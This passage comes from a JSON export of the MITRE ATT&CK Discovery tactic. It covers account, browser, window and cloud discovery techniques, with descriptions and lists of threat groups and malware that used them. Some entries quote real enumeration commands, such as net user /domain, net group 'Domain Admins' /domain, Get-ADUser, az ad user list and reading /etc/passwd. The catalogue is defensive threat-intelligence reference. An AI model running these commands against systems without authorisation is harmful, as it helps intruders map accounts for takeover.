Native operating system tools are often used toward this post-compromise information-gathering objective.", "id": "TA0007", "techniques": [{"name": "Account Discovery", "description": "Adversaries may attempt to get a listing of valid accounts, usernames, or email addresses on a system or within a compromised environment. This information can help adversaries determine which accounts exist, which can aid in follow-on behavior such as brute-forcing, spear-phishing attacks, or account takeovers (e.g., Valid Accounts).", "detailed_description": "Adversaries may attempt to get a listing of valid accounts, usernames, or email addresses on a system or within a compromised environment. This information can help adversaries determine which accounts exist, which can aid in follow-on behavior such as brute-forcing, spear-phishing attacks, or account takeovers (e.g., Valid Accounts).\nAdversaries may use several methods to enumerate accounts, including abuse of existing tools, built-in commands, and potential misconfigurations that leak account names and roles or permissions in the targeted environment.\nFor examples, cloud environments typically provide easily accessible interfaces to obtain user lists. On hosts, adversaries can use default PowerShell and other command line functionality to identify accounts. Information about email addresses and accounts may also be extracted by searching an infected system\u2019s files.", "id": "T1087", "examples": [{"id": "G0143", "name": "Aquatic Panda", "description": "Aquatic Panda used the last command in Linux environments to identify recently logged-in users on victim machines."}, {"id": "G1016", "name": "FIN13", "description": "FIN13 has enumerated all users and their roles from a victim's main treasury system."}, {"id": "S0445", "name": "ShimRatReporter", "description": "ShimRatReporter listed all non-privileged and privileged accounts available on the machine."}, {"id": "C0024", "name": "SolarWinds Compromise", "description": "During the SolarWinds Compromise, APT29 obtained a list of users and their roles from an Exchange server using Get-ManagementRoleAssignment."}, {"id": "S1065", "name": "Woody RAT", "description": "Woody RAT can identify administrator accounts on an infected machine."}, {"id": "S0658", "name": "XCSSET", "description": "XCSSET attempts to discover accounts from various locations such as a user's Evernote, AppleID, Telegram, Skype, and WeChat data."}], "sub_techniques": [{"name": "Local Account", "description": "Adversaries may attempt to get a listing of local system accounts. This information can help adversaries determine which local accounts exist on a system to aid in follow-on behavior.", "detailed_description": "Adversaries may attempt to get a listing of local system accounts. This information can help adversaries determine which local accounts exist on a system to aid in follow-on behavior.\nCommands such as net user and net localgroup of the Net utility and id and groups on macOS and Linux can list local users and groups. On Linux, local users can also be enumerated through the use of the /etc/passwd file. On macOS the dscl . list /Users command can be used to enumerate local accounts.", "id": "T1087.001", "examples": [{"id": "G0018", "name": "admin@338", "description": "admin@338 actors used the following commands following exploitation of a machine with LOWBALL malware to enumerate user accounts: net user >> %temp%\\download net user /domain >> %temp%\\download"}, {"id": "S0331", "name": "Agent Tesla", "description": "Agent Tesla can collect account information from the victim\u2019s machine."}, {"id": "G0006", "name": "APT1", "description": "APT1 used the commands net localgroup,net user, and net group to find accounts on the system."}, {"id": "G0022", "name": "APT3", "description": "APT3 has used a tool that can obtain info about local and global group users, power users, and administrators."}, {"id": "G0050", "name": "APT32", "description": "APT32 enumerated administrative users using the commands net localgroup administrators."}, {"id": "G0096", "name": "APT41", "description": "APT41 used built-in net commands to enumerate local administrator groups."}, {"id": "S0239", "name": "Bankshot", "description": "Bankshot gathers domain and account names/information through process monitoring."}, {"id": "S0534", "name": "Bazar", "description": "Bazar can identify administrator accounts on an infected host."}, {"id": "S0570", "name": "BitPaymer", "description": "BitPaymer can enumerate the sessions for each user logged onto the infected host."}, {"id": "S0521", "name": "BloodHound", "description": "BloodHound can identify users with local administrator rights."}, {"id": "G0114", "name": "Chimera", "description": "Chimera has used net user for account discovery."}, {"id": "S0244", "name": "Comnie", "description": "Comnie uses the net user command."}, {"id": "S0038", "name": "Duqu", "description": "The discovery modules used with Duqu can collect information on accounts and permissions."}, {"id": "S1159", "name": "DUSTTRAP", "description": "DUSTTRAP can enumerate local user accounts."}, {"id": "S0081", "name": "Elise", "description": "Elise executes net user after initial communication is made to the remote server."}, {"id": "S0363", "name": "Empire", "description": "Empire can acquire local and domain user account information."}, {"id": "S0091", "name": "Epic", "description": "Epic gathers a list of all user accounts, privilege classes, and time of last logon."}, {"id": "G0117", "name": "Fox Kitten", "description": "Fox Kitten has accessed ntuser.dat and UserClass.dat on compromised hosts."}, {"id": "S0049", "name": "GeminiDuke", "description": "GeminiDuke collects information on local user accounts from the victim."}, {"id": "S0537", "name": "HyperStack", "description": "HyperStack can enumerate all account names on a remote share."}, {"id": "S0260", "name": "InvisiMole", "description": "InvisiMole has a command to list account information on the victim\u2019s machine."}, {"id": "S0265", "name": "Kazuar", "description": "Kazuar gathers information on local groups and members on the victim\u2019s machine."}, {"id": "G0004", "name": "Ke3chang", "description": "Ke3chang performs account discovery using commands such as net localgroup administrators and net group \"REDACTED\" /domain on specific permissions groups."}, {"id": "S0236", "name": "Kwampirs", "description": "Kwampirs collects a list of accounts with the command net users."}, {"id": "S1146", "name": "MgBot", "description": "MgBot includes modules for identifying local administrator accounts on victim systems."}, {"id": "S1015", "name": "Milan", "description": "Milan has run C:\\Windows\\system32\\cmd.exe /c cmd /c dir c:\\users\\ /s 2>&1 to discover local accounts."}, {"id": "S0084", "name": "Mis-Type", "description": "Mis-Type may create a file containing the results of the command cmd.exe /c net user {Username}."}, {"id": "G1009", "name": "Moses Staff", "description": "Moses Staff has collected the administrator username from a compromised host."}, {"id": "S0233", "name": "MURKYTOP", "description": "MURKYTOP has the capability to retrieve information about users on remote hosts."}, {"id": "S0039", "name": "Net", "description": "Commands under net user can be used in Net to gather information about and manipulate user accounts."}, {"id": "G0049", "name": "OilRig", "description": "OilRig has run net user, net user /domain, net group \"domain admins\" /domain, and net group \"Exchange Trusted Subsystem\" /domain to get account listings on a victim."}, {"id": "C0012", "name": "Operation CuckooBees", "description": "During Operation CuckooBees, the threat actors used the net user command to gather account information."}, {"id": "S0165", "name": "OSInfo", "description": "OSInfo enumerates local and domain users"}, {"id": "S0598", "name": "P.A.S. Webshell", "description": "P.A.S. Webshell can display the /etc/passwd file on a compromised host."}, {"id": "S1145", "name": "Pikabot", "description": "Pikabot will retrieve the name of the user associated with the thread under which the malware is executing."}, {"id": "S0453", "name": "Pony", "description": "Pony has used the NetUserEnum function to enumerate local accounts."}, {"id": "G0033", "name": "Poseidon Group", "description": "Poseidon Group searches for administrator accounts on both the local victim machine and the network."}, {"id": "S0378", "name": "PoshC2", "description": "PoshC2 can enumerate local and domain user account information."}, {"id": "S0194", "name": "PowerSploit", "description": "PowerSploit's Get-ProcessTokenGroup Privesc-PowerUp module can enumerate all SIDs associated with its current token."}, {"id": "S0223", "name": "POWERSTATS", "description": "POWERSTATS can retrieve usernames from compromised hosts."}, {"id": "S0196", "name": "PUNCHBUGGY", "description": "PUNCHBUGGY can gather user names."}, {"id": "S0192", "name": "Pupy", "description": "Pupy uses PowerView and Pywerview to perform discovery commands such as net user, net group, net local group, etc."}, {"id": "S1148", "name": "Raccoon Stealer", "description": "Raccoon Stealer checks the privileges of running processes to determine if the running user is equivalent to NT Authority\\System."}, {"id": "S0241", "name": "RATANKBA", "description": "RATANKBA uses the net user command."}, {"id": "G1039", "name": "RedCurl", "description": "RedCurl has collected information about local accounts."}, {"id": "S0125", "name": "Remsec", "description": "Remsec can obtain a list of users."}, {"id": "S0085", "name": "S-Type", "description": "S-Type has run the command net user on a victim."}, {"id": "S0063", "name": "SHOTPUT", "description": "SHOTPUT has a command to retrieve information about connected users."}, {"id": "S0649", "name": "SMOKEDHAM", "description": "SMOKEDHAM has used net.exe user and net.exe users to enumerate local accounts on a compromised host."}, {"id": "S0516", "name": "SoreFang", "description": "SoreFang can collect usernames from the local system via net.exe user."}, {"id": "S0603", "name": "Stuxnet", "description": "Stuxnet enumerates user accounts of the local host."}, {"id": "G0027", "name": "Threat Group-3390", "description": "Threat Group-3390 has used net user to conduct internal discovery of systems."}, {"id": "S0266", "name": "TrickBot", "description": "TrickBot collects the users of the system."}, {"id": "G0010", "name": "Turla", "description": "Turla has used net user to enumerate local accounts on the system."}, {"id": "S0452", "name": "USBferry", "description": "USBferry can use net user to gather information about local accounts."}, {"id": "S0476", "name": "Valak", "description": "Valak has the ability to enumerate local admin accounts."}, {"id": "G1017", "name": "Volt Typhoon", "description": "Volt Typhoon has executed net user and quser to enumerate local account information."}]}, {"name": "Domain Account", "description": "Adversaries may attempt to get a listing of domain accounts. This information can help adversaries determine which domain accounts exist to aid in follow-on behavior such as targeting specific accounts which possess particular privileges.", "detailed_description": "Adversaries may attempt to get a listing of domain accounts. This information can help adversaries determine which domain accounts exist to aid in follow-on behavior such as targeting specific accounts which possess particular privileges.\nCommands such as net user /domain and net group /domain of the Net utility, dscacheutil -q group on macOS, and ldapsearch on Linux can list domain users and groups. PowerShell cmdlets including Get-ADUser and Get-ADGroupMember may enumerate members of Active Directory groups.", "id": "T1087.002", "examples": [{"id": "S0552", "name": "AdFind", "description": "AdFind can enumerate domain users."}, {"id": "G0096", "name": "APT41", "description": "APT41 used built-in net commands to enumerate domain administrator users."}, {"id": "S0239", "name": "Bankshot", "description": "Bankshot gathers domain and account names/information through process monitoring."}, {"id": "S0534", "name": "Bazar", "description": "Bazar has the ability to identify domain administrator accounts."}, {"id": "S1068", "name": "BlackCat", "description": "BlackCat can utilize net use commands to identify domain users."}, {"id": "S0521", "name": "BloodHound", "description": "BloodHound can collect information about domain users, including identification of domain admin accounts."}, {"id": "S0635", "name": "BoomBox", "description": "BoomBox has the ability to execute an LDAP query to enumerate the distinguished name, SAM account name, and display name for all domain users."}, {"id": "G0060", "name": "BRONZE BUTLER", "description": "BRONZE BUTLER has used net user /domain to identify account information."}, {"id": "S1063", "name": "Brute Ratel C4", "description": "Brute Ratel C4 can use LDAP queries, net group \"Domain Admins\" /domain and net user /domain for discovery."}, {"id": "G0114", "name": "Chimera", "description": "Chimera has has used net user /dom and net user Administrator to enumerate domain accounts including administrator accounts."}, {"id": "S0154", "name": "Cobalt Strike", "description": "Cobalt Strike can determine if the user on an infected machine is in the admin or domain admin group."}, {"id": "S0488", "name": "CrackMapExec", "description": "CrackMapExec can enumerate the domain user accounts on a targeted system."}, {"id": "G0035", "name": "Dragonfly", "description": "Dragonfly has used batch scripts to enumerate users on a victim domain controller."}, {"id": "S0105", "name": "dsquery", "description": "dsquery can be used to gather information on user accounts within a domain."}, {"id": "S1159", "name": "DUSTTRAP", "description": "DUSTTRAP can enumerate domain accounts."}, {"id": "S0363", "name": "Empire", "description": "Empire can acquire local and domain user account information."}, {"id": "G1016", "name": "FIN13", "description": "FIN13 can identify user accounts associated with a Service Principal Name and query Service Principal Names within the domain by utilizing the following scripts: GetUserSPNs.vbs and querySpn.vbs."}, {"id": "G0037", "name": "FIN6", "description": "FIN6 has used Metasploit\u2019s PsExec NTDSGRAB module to obtain a copy of the victim's Active Directory database."}, {"id": "G0117", "name": "Fox Kitten", "description": "Fox Kitten has used the Softerra LDAP browser to browse documentation on service accounts."}, {"id": "S1022", "name": "IceApple", "description": "The IceApple Active Directory Querier module  can perform authenticated requests against an Active Directory server."}, {"id": "S0483", "name": "IcedID", "description": "IcedID can query LDAP and can use built-in net commands to identify additional users on the network to infect."}, {"id": "G1032", "name": "INC Ransom", "description": "INC Ransom has scanned for domain admin accounts in compromised environments."}, {"id": "G0004", "name": "Ke3chang", "description": "Ke3chang performs account discovery using commands such as net localgroup administrators and net group \"REDACTED\" /domain on specific permissions groups."}, {"id": "G1004", "name": "LAPSUS$", "description": "LAPSUS$ has used the AD Explorer tool to enumerate users on a victim's network."}, {"id": "S1160", "name": "Latrodectus", "description": "Latrodectus can run C:\\Windows\\System32\\cmd.exe /c net group \"Domain Admins\" /domain to identify domain administrator accounts."}, {"id": "G0045", "name": "menuPass", "description": "menuPass has used the Microsoft administration tool csvde.exe to export Active Directory data."}, {"id": "S1146", "name": "MgBot", "description": "MgBot includes modules for collecting information on Active Directory domain accounts."}, {"id": "G0069", "name": "MuddyWater", "description": "MuddyWater has used cmd.exe net user /domain to enumerate domain users."}, {"id": "S0039", "name": "Net", "description": "Net commands used with the /domain flag can be used to gather information about and manipulate user accounts on the current domain."}, {"id": "G0049", "name": "OilRig", "description": "OilRig has run net user, net user /domain, net group \"domain admins\" /domain, and net group \"Exchange Trusted Subsystem\" /domain to get account listings on a victim."}, {"id": "C0012", "name": "Operation CuckooBees", "description": "During Operation CuckooBees, the threat actors used the dsquery and dsget commands to get domain environment information and to query users in administrative groups."}, {"id": "C0022", "name": "Operation Dream Job", "description": "During Operation Dream Job, Lazarus Group queried compromised victim's active directory servers to obtain the list of employees including administrator accounts."}, {"id": "C0014", "name": "Operation Wocao", "description": "During Operation Wocao, threat actors used the net command to retrieve information about domain accounts."}, {"id": "S0165", "name": "OSInfo", "description": "OSInfo enumerates local and domain users"}, {"id": "G0033", "name": "Poseidon Group", "description": "Poseidon Group searches for administrator accounts on both the local victim machine and the network."}, {"id": "S0378", "name": "PoshC2", "description": "PoshC2 can enumerate local and domain user account information."}, {"id": "S0184", "name": "POWRUNER", "description": "POWRUNER may collect user account information by running net user /domain or a series of other commands on a victim."}, {"id": "G1039", "name": "RedCurl", "description": "RedCurl has collected information about domain accounts using SysInternal\u2019s AdExplorer functionality   ."}, {"id": "G0034", "name": "Sandworm Team", "description": "Sandworm Team has used a tool to query Active Directory using LDAP, discovering information about usernames listed in AD."}, {"id": "G1015", "name": "Scattered Spider", "description": "Scattered Spider leverages legitimate domain accounts to gain access to the target environment."}, {"id": "S0692", "name": "SILENTTRINITY", "description": "SILENTTRINITY can use System.Security.AccessControl namespaces to retrieve domain user information."}, {"id": "C0024", "name": "SolarWinds Compromise", "description": "During the SolarWinds Compromise, APT29 used PowerShell to discover domain accounts by exectuing Get-ADUser and Get-ADGroupMember."}, {"id": "S0516", "name": "SoreFang", "description": "SoreFang can enumerate domain accounts via net.exe user /domain."}, {"id": "S0603", "name": "Stuxnet", "description": "Stuxnet enumerates user accounts of the domain."}, {"id": "S0018", "name": "Sykipot", "description": "Sykipot may use net group \"domain admins\" /domain to display accounts in the \"domain admins\" permissions group and net localgroup \"administrators\" to list local system administrator group membership."}, {"id": "G1022", "name": "ToddyCat", "description": "ToddyCat has run net user %USER% /dom for account discovery."}, {"id": "G0010", "name": "Turla", "description": "Turla has used net user /domain to enumerate domain accounts."}, {"id": "S0476", "name": "Valak", "description": "Valak has the ability to enumerate domain admin accounts."}, {"id": "G1017", "name": "Volt Typhoon", "description": "Volt Typhoon has run net group /dom and net group \"Domain Admins\" /dom in compromised environments for account discovery."}, {"id": "G0102", "name": "Wizard Spider", "description": "Wizard Spider has identified domain admins through the use of net group \"Domain admins\" /DOMAIN. Wizard Spider has also leveraged the PowerShell cmdlet Get-ADComputer to collect account names from Active Directory data."}]}, {"name": "Email Account", "description": "Adversaries may attempt to get a listing of email addresses and accounts. Adversaries may try to dump Exchange address lists such as global address lists (GALs).", "detailed_description": "Adversaries may attempt to get a listing of email addresses and accounts. Adversaries may try to dump Exchange address lists such as global address lists (GALs).\nIn on-premises Exchange and Exchange Online, the Get-GlobalAddressList PowerShell cmdlet can be used to obtain email addresses and accounts from a domain using an authenticated session.\nIn Google Workspace, the GAL is shared with Microsoft Outlook users through the Google Workspace Sync for Microsoft Outlook (GWSMO) service. Additionally, the Google Workspace Directory allows for users to get a listing of other users within the organization.", "id": "T1087.003", "examples": [{"id": "S0093", "name": "Backdoor.Oldrea", "description": "Backdoor.Oldrea collects address book information from Outlook."}, {"id": "S0635", "name": "BoomBox", "description": "BoomBox can execute an LDAP query to discover e-mail accounts for domain users."}, {"id": "C0027", "name": "C0027", "description": "During C0027, Scattered Spider accessed Azure AD to identify email addresses."}, {"id": "S0367", "name": "Emotet", "description": "Emotet has been observed leveraging a module that can scrape email addresses from Outlook."}, {"id": "S0531", "name": "Grandoreiro", "description": "Grandoreiro can parse Outlook .pst files to extract e-mail addresses."}, {"id": "C0038", "name": "HomeLand Justice", "description": "During HomeLand Justice, threat actors used compromised Exchange accounts to search mailboxes for administrator accounts."}, {"id": "S0681", "name": "Lizar", "description": "Lizar can collect email accounts from Microsoft Outlook and Mozilla Thunderbird."}, {"id": "G0059", "name": "Magic Hound", "description": "Magic Hound has used Powershell to discover email accounts."}, {"id": "S0413", "name": "MailSniper", "description": "MailSniper can be used to obtain account names from Exchange and Office 365 using the Get-GlobalAddressList cmdlet."}, {"id": "G1039", "name": "RedCurl", "description": "RedCurl has collected information about email accounts."}, {"id": "S0358", "name": "Ruler", "description": "Ruler can be used to enumerate Exchange users and dump the GAL."}, {"id": "G0034", "name": "Sandworm Team", "description": "Sandworm Team used malware to enumerate email settings, including usernames and passwords, from the M.E.Doc application."}, {"id": "G0092", "name": "TA505", "description": "TA505 has used the tool EmailStealer to steal and send lists of e-mail addresses to a remote server."}, {"id": "S0266", "name": "TrickBot", "description": "TrickBot collects email addresses from Outlook."}]}, {"name": "Cloud Account", "description": "Adversaries may attempt to get a listing of cloud accounts. Cloud accounts are those created and configured by an organization for use by users, remote support, services, or for administration of resources within a cloud service provider or SaaS application.", "detailed_description": "Adversaries may attempt to get a listing of cloud accounts. Cloud accounts are those created and configured by an organization for use by users, remote support, services, or for administration of resources within a cloud service provider or SaaS application.\nWith authenticated access there are several tools that can be used to find accounts. The Get-MsolRoleMember PowerShell cmdlet can be used to obtain account names given a role or permissions group in Office 365. The Azure CLI (AZ CLI) also provides an interface to obtain user accounts with authenticated access to a domain. The command az ad user list will list all users within a domain.\nThe AWS command aws iam list-users may be used to obtain a list of users in the current account while aws iam list-roles can obtain IAM roles that have a specified path prefix. In GCP, gcloud iam service-accounts list and gcloud projects get-iam-policy may be used to obtain a listing of service accounts and users in a project.", "id": "T1087.004", "examples": [{"id": "S0677", "name": "AADInternals", "description": "AADInternals can enumerate Azure AD users."}, {"id": "G0016", "name": "APT29", "description": "APT29 has conducted enumeration of Azure AD accounts."}, {"id": "C0027", "name": "C0027", "description": "During C0027, Scattered Spider accessed Azure AD to download bulk lists of group members and to identify privileged users, along with the email addresses and AD attributes."}, {"id": "S1091", "name": "Pacu", "description": "Pacu can enumerate IAM users, roles, and groups. "}, {"id": "S0684", "name": "ROADTools", "description": "ROADTools can enumerate Azure AD users."}]}]}, {"name": "Application Window Discovery", "description": "Adversaries may attempt to get a listing of open application windows. Window listings could convey information about how the system is used. For example, information about application windows could be used identify potential data to collect as well as identifying security tooling (Security Software Discovery) to evade.", "detailed_description": "Adversaries may attempt to get a listing of open application windows. Window listings could convey information about how the system is used. For example, information about application windows could be used identify potential data to collect as well as identifying security tooling (Security Software Discovery) to evade.\nAdversaries typically abuse system features for this type of enumeration. For example, they may gather information through native system features such as Command and Scripting Interpreter commands and Native API functions.", "id": "T1010", "examples": [{"id": "S0456", "name": "Aria-body", "description": "Aria-body has the ability to identify the titles of running windows on a compromised host."}, {"id": "S0438", "name": "Attor", "description": "Attor can obtain application window titles and then determines which windows to perform Screen Capture on."}, {"id": "S0454", "name": "Cadelspy", "description": "Cadelspy has the ability to identify open windows on the compromised host."}, {"id": "S0261", "name": "Catchamas", "description": "Catchamas obtains application windows titles and then determines which windows to perform Screen Capture on."}, {"id": "S1111", "name": "DarkGate", "description": "DarkGate will search for cryptocurrency wallets by examining application window names for specific strings. DarkGate extracts information collected via NirSoft tools from the hosting process's memory by first identifying the window through the FindWindow API function."}, {"id": "S0673", "name": "DarkWatchman", "description": "DarkWatchman reports window names along with keylogger information to provide application context."}, {"id": "S0038", "name": "Duqu", "description": "The discovery modules used with Duqu can collect information on open windows."}, {"id": "S1159", "name": "DUSTTRAP", "description": "DUSTTRAP can enumerate running application windows."}, {"id": "S0696", "name": "Flagpro", "description": "Flagpro can check the name of the window displayed on the system."}, {"id": "S1044", "name": "FunnyDream", "description": "FunnyDream has the ability to discover application windows via execution of EnumWindows."}, {"id": "S0531", "name": "Grandoreiro", "description": "Grandoreiro can identify installed security tools based on window names."}, {"id": "G1001", "name": "HEXANE", "description": "HEXANE has used a PowerShell-based keylogging tool to capture the window title."}, {"id": "S0431", "name": "HotCroissant", "description": "HotCroissant has the ability to list the names of all open windows on the infected host."}, {"id": "S0260", "name": "InvisiMole", "description": "InvisiMole can enumerate windows and child windows on a compromised host."}, {"id": "S0265", "name": "Kazuar", "description": "Kazuar gathers information about opened windows."}, {"id": "G0032", "name": "Lazarus Group", "description": "Lazarus Group malware IndiaIndia obtains and sends to its C2 server the title of the window for each running process. The KilaAlfa keylogger also reports the title of the window in the foreground."}, {"id": "S0409", "name": "Machete", "description": "Machete saves the window names."}, {"id": "S0455", "name": "Metamorfo", "description": "Metamorfo can enumerate all windows on the victim\u2019s machine."}, {"id": "S0033", "name": "NetTraveler", "description": "NetTraveler reports window names along with keylogger information to provide application context."}, {"id": "S0198", "name": "NETWIRE", "description": "NETWIRE can discover and close windows on controlled systems."}, {"id": "S1090", "name": "NightClub", "description": "NightClub can use GetForegroundWindow to enumerate the active window."}, {"id": "S0385", "name": "njRAT", "description": "njRAT gathers information about opened windows during the initial infection."}, {"id": "S0435", "name": "PLEAD", "description": "PLEAD has the ability to list open windows on the compromised host."}, {"id": "S0012", "name": "PoisonIvy", "description": "PoisonIvy captures window titles."}, {"id": "S0139", "name": "PowerDuke", "description": "PowerDuke has a command to get text of the current foreground window."}, {"id": "S0650", "name": "QakBot", "description": "QakBot has the ability to enumerate windows on a compromised host."}, {"id": "S0375", "name": "Remexi", "description": "Remexi has a command to capture active windows on the machine and retrieve window titles."}, {"id": "S0240", "name": "ROKRAT", "description": "ROKRAT can use  the GetForegroundWindow and GetWindowText APIs to discover where the user is typing."}, {"id": "S0692", "name": "SILENTTRINITY", "description": "SILENTTRINITY can enumerate the active Window during keylogging through execution of GetActiveWindowTitle."}, {"id": "S0157", "name": "SOUNDBITE", "description": "SOUNDBITE is capable of enumerating application windows."}, {"id": "S0094", "name": "Trojan.Karagany", "description": "Trojan.Karagany can monitor the titles of open windows to identify specific keywords."}, {"id": "G1017", "name": "Volt Typhoon", "description": "Volt Typhoon has collected window title information from compromised systems."}, {"id": "S0219", "name": "WINERACK", "description": "WINERACK can enumerate active windows."}], "sub_techniques": []}, {"name": "Browser Information Discovery", "description": "Adversaries may enumerate information about browsers to learn more about compromised environments. Data saved by browsers (such as bookmarks, accounts, and browsing history) may reveal a variety of personal information about users (e.g., banking sites, relationships/interests, social media, etc.) as well as details about internal network resources such as servers, tools/dashboards, or other related infrastructure.", "detailed_description": "Adversaries may enumerate information about browsers to learn more about compromised environments. Data saved by browsers (such as bookmarks, accounts, and browsing history) may reveal a variety of personal information about users (e.g., banking sites, relationships/interests, social media, etc.) as well as details about internal network resources such as servers, tools/dashboards, or other related infrastructure.\nBrowser information may also highlight additional targets after an adversary has access to valid credentials, especially Credentials In Files associated with logins cached by a browser.\nSpecific storage locations vary based on platform and/or application, but browser information is typically stored in local files and databases (e.g., %APPDATA%/Google/Chrome).", "id": "T1217", "examples": [{"id": "G0082", "name": "APT38", "description": "APT38 has collected browser bookmark information to learn more about compromised hosts, obtain personal information about users, and acquire details about internal network resources."}, {"id": "S0274", "name": "Calisto", "description": "Calisto collects information on bookmarks from Google Chrome."}, {"id": "G0114", "name": "Chimera", "description": "Chimera has used type \\\\c$\\Users\\\\Favorites\\Links\\Bookmarks bar\\Imported From IE*citrix* for bookmark discovery."}, {"id": "S1153", "name": "Cuckoo Stealer", "description": "Cuckoo Stealer can collect bookmarks, cookies, and history from Safari."}, {"id": "S0673", "name": "DarkWatchman", "description": "DarkWatchman can retrieve browser history."}, {"id": "S0567", "name": "Dtrack", "description": "Dtrack can retrieve browser history."}, {"id": "S0363", "name": "Empire", "description": "Empire has the ability to gather browser data such as bookmarks and visited sites."}, {"id": "G0117", "name": "Fox Kitten", "description": "Fox Kitten has used Google Chrome bookmarks to identify internal resources and assets."}, {"id": "S0681", "name": "Lizar", "description": "Lizar can retrieve browser history and database files."}, {"id": "S0409", "name": "Machete", "description": "Machete retrieves the user profile data (e.g., browsers) from Chrome and Firefox browsers."}, {"id": "S1060", "name": "Mafalda", "description": "Mafalda can collect the contents of the %USERPROFILE%\\AppData\\Local\\Google\\Chrome\\User Data\\LocalState file."}, {"id": "S1122", "name": "Mispadu", "description": "Mispadu can monitor browser activity for online banking actions and display full-screen overlay images to block user access to the intended site or present additional data fields."}, {"id": "S0079", "name": "MobileOrder", "description": "MobileOrder has a command to upload to its C2 server victim browser bookmarks."}, {"id": "G1036", "name": "Moonstone Sleet", "description": "Moonstone Sleet deployed malware such as YouieLoader capable of capturing victim system browser information."}, {"id": "S1012", "name": "PowerLess", "description": "PowerLess has a browser info stealer module that can read Chrome and Edge browser database files."}, {"id": "G1015", "name": "Scattered Spider", "description": "Scattered Spider retrieves browser histories via infostealer malware such as Raccoon Stealer."}, {"id": "S1042", "name": "SUGARDUMP", "description": "SUGARDUMP has collected browser bookmark and history information."}, {"id": "G1017", "name": "Volt Typhoon", "description": "Volt Typhoon has targeted the browsing history of network administrators."}], "sub_techniques": []}, {"name": "Cloud Infrastructure Discovery", "description": "An adversary may attempt to discover infrastructure and resources that are available within an infrastructure-as-a-service (IaaS) environment. This includes compute service resources such as instances, virtual machines, and snapshots as well as resources of other services including the storage and database services.", "detailed_description": "An adversary may attempt to discover infrastructure and resources that are available within an infrastructure-as-a-service (IaaS) environment. This includes compute service resources such as instances, virtual machines, and snapshots as well as resources of other services including the storage and database services.\nCloud providers offer methods such as APIs and commands issued through CLIs to serve information about infrastructure. For example, AWS provides a DescribeInstances API within the Amazon EC2 API that can return information about one or more instances within an account, the ListBuckets API that returns a list of all buckets owned by the authenticated sender of the request, the HeadBucket API to determine a bucket\u2019s existence along with access permissions of the request sender, or the GetPublicAccessBlock API to retrieve access block configuration for a bucket. Similarly, GCP's Cloud SDK CLI provides the gcloud compute instances list command to list all Google Compute Engine instances in a project , and Azure's CLI command az vm list lists details of virtual machines. In addition to API commands, adversaries can utilize open source tools to discover cloud storage infrastructure through Wordlist Scanning.\nAn adversary may enumerate resources using a compromised user's access keys to determine which are available to that user. The discovery of these available resources may help adversaries determine their next steps in the Cloud environment, such as establishing Persistence.An adversary may also use this information to change the configuration to make the bucket publicly accessible, allowing data to be accessed without authentication. Adversaries have also may use infrastructure discovery APIs such as DescribeDBInstances to determine size, owner, permissions, and network ACLs of database resources.  Adversaries can use this information to determine the potential value of databases and discover the requirements to access them. Unlike in Cloud Service Discovery, this technique focuses on the discovery of components of the provided services rather than the services themselves.", "id": "T1580", "examples": [{"id": "S1091", "name": "Pacu", "description": "Pacu can enumerate AWS infrastructure, such as EC2 instances."}, {"id": "G1015", "name": "Scattered Spider", "description": "Scattered Spider enumerates cloud environments to identify server and backup management infrastructure, resource access, databases and storage containers."}], "sub_techniques": []}, {"name": "Cloud Service Dashboard", "description": "An adversary may use a cloud service dashboard GUI with stolen credentials to gain useful information from an operational cloud environment, such as specific services, resources, and features. For example, the GCP Command Center can be used to view all assets, findings of potential security risks, and to run additional queries, such as finding public IP addresses and open ports.", "detailed_description": "An adversary may use a cloud service dashboard GUI with stolen credentials to gain useful information from an operational cloud environment, such as specific services, resources, and features. For example, the GCP Command Center can be used to view all assets, findings of potential security risks, and to run additional queries, such as finding public IP addresses and open ports.\nDepending on the configuration of the environment, an adversary may be able to enumerate more information via the graphical dashboard than an API. This allows the adversary to gain information without making any API requests.", "id": "T1538", "examples": [{"id": "G1015", "name": "Scattered Spider", "description": "Scattered Spider abused AWS Systems Manager Inventory to identify targets on the compromised network prior to lateral movement."}], "sub_techniques": []}, {"name": "Cloud Service Discovery", "description": "An adversary may attempt to enumerate the cloud services running on a system after gaining access. These methods can differ from platform-as-a-service (PaaS), to infrastructure-as-a-service (IaaS), or software-as-a-service (SaaS). Many services exist throughout the various cloud providers and can include Continuous Integration and Continuous Delivery (CI/CD), Lambda Functions, Entra ID, etc. They may also include security services, such as AWS GuardDuty and Microsoft Defender for Cloud, and logging services, such as AWS CloudTrail and Google Cloud Audit Logs.", "detailed_description": "An adversary may attempt to enumerate the cloud services running on a system after gaining access. These methods can differ from platform-as-a-service (PaaS), to infrastructure-as-a-service (IaaS), or software-as-a-service (SaaS). Many services exist throughout the various cloud providers and can include Continuous Integration and Continuous Delivery (CI/CD), Lambda Functions, Entra ID, etc. They may also include security services, such as AWS GuardDuty and Microsoft Defender for Cloud, and logging services, such as AWS CloudTrail and Google Cloud Audit Logs.\nAdversaries may attempt to discover information about the services enabled throughout the environment. Azure tools and APIs, such as the Microsoft Graph API and Azure Resource Manager API, can enumerate resources and services, including applications, management groups, resources and policy definitions, and their relationships that are accessible by an identity.\nFor example, Stormspotter is an open source tool for enumerating and constructing a graph for Azure resources and services, and Pacu is an open source AWS exploitation framework that supports several methods for discovering cloud services.\nAdversaries may use the information gained to shape follow-on behaviors, such as targeting data or credentials from enumerated services or evading identified defenses through Disable or Modify Tools or Disable or Modify Cloud Logs.", "id": "T1526", "examples": [{"id": "S0677", "name": "AADInternals", "description": "AADInternals can enumerate information about a variety of cloud services, such as Office 365 and Sharepoint instances or OpenID Configurations."}, {"id": "S1091", "name": "Pacu", "description": "Pacu can enumerate AWS services, such as CloudTrail and CloudWatch."}, {"id": "S0684", "name": "ROADTools", "description": "ROADTools can enumerate Azure AD applications and service principals."}], "sub_techniques": []}, {"name": "Cloud Storage Object Discovery", "description": "Adversaries may enumerate objects in cloud storage infrastructure. Adversaries may use this information during automated discovery to shape follow-on behaviors, including requesting all or specific objects from cloud storage.  Similar to File and Directory Discovery on a local host, after identifying available storage services (i.e. Cloud Infrastructure Discovery) adversaries may access the contents/objects stored in cloud infrastructure.", "detailed_description": "Adversaries may enumerate objects in cloud storage infrastructure. Adversaries may use this information during automated discovery to shape follow-on behaviors, including requesting all or specific objects from cloud storage.  Similar to File and Directory Discovery on a local host, after identifying available storage services (i.e. Cloud Infrastructure Discovery) adversaries may access the contents/objects stored in cloud infrastructure.\nCloud service providers offer APIs allowing users to enumerate objects stored within cloud storage. Examples include ListObjectsV2 in AWS  and List Blobs in Azure .", "id": "T1619", "examples": [{"id": "S1091", "name": "Pacu", "description": "Pacu can enumerate AWS storage services, such as S3 buckets and Elastic 